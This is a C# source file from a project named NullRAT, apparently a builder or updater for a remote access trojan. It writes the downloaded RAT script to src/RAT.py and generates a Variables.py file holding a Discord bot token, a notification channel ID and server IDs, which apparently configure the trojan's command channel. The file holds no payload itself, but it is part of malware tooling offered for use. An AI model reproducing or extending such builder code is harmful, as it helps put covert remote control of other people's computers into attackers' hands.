using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace NullRAT.Variables;
internal static class WriteFile
{
    /// <summary>
    /// Reads RequestResponse of the RAT download request. Then using DataAsString converted to Bytes[] it overwrites the RAT
    /// </summary>
    public static async Task WriteRAT(Updater updaterInstance)
        => await File.WriteAllTextAsync(Environment.CurrentDirectory + "/src/RAT.py", updaterInstance.Rat_script);

    public static async Task WriteVariables(RATVariables ratVars)
    {
        // Path to Variables.py
        StreamWriter writer = File.CreateText(Environment.CurrentDirectory + "/src/Variables.py");

        // Write them ACCORDINGLY.
        // Examples:
        // variables[1] = Notif Channel ID
        // varNames[1] = Notif Channel ID Variable name
        // NOTE: Servers IDs are not included.
        string[] variables = new string[2]
        {
            ratVars.Bot_Token.ToString(),
            ratVars.Notification_Channel_ID.ToString()
        };
        string[] varNames = new string[3]
        {
            "bot_token",
            "notification_channel",
            "server_ids"
        };

        // Write Bot Token and Notification channel at once
        writer.WriteLine("# This file was auto-generated by NullRAT Variables. DO NOT SHARE!");
        writer.WriteLine($"{varNames[0]} = \"{variables[0]}\"");
        writer.WriteLine($"{varNames[1]} = {variables[1]}");

        // Write server ids.
        await writer.WriteAsync($"{varNames[2]} = [{await Utils.GetListAsString(ratVars.Server_IDs)}]");
        //Flush buffer, dispose writer and close.
        await writer.FlushAsync();
        await writer.DisposeAsync();
        writer.Close();
    }
}